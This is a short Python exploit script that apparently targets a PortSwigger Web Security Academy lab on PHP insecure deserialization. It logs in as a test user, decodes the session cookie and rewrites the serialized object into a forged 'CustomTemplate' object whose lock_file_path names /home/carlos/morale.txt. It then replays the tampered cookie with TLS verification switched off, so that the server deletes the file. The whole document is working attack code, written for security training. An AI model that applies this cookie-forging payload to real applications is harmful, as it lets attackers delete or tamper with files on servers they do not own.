import urllib.parse
import base64
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# get cookie
url = "https://0a0200cc0433d9dec0c6b5aa00c700e4.web-security-academy.net/login"
values = {"username": "wiener", "password": "peter"}
r = requests.post(url, data=values, allow_redirects=False, verify=False)
cookie = r.cookies.get_dict()['session']


# base64, url encode and decode
url_decode = urllib.parse.unquote(cookie)
base64_d = base64.b64decode(url_decode)
deserialized = str(base64_d.decode())

access_token = re.sub(r'O:[a-zA-Z0-9:"{};_]+', 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}', deserialized)
serial_base64_encode = base64.b64encode(bytes(access_token, encoding="utf-8"))
serial_url_encode = urllib.parse.quote_plus(serial_base64_encode)
headers = {"cookie": "session="+serial_url_encode}

# exploit

r = requests.post("https://0a0200cc0433d9dec0c6b5aa00c700e4.web-security-academy.net/", headers=headers, allow_redirects=False, verify=False)
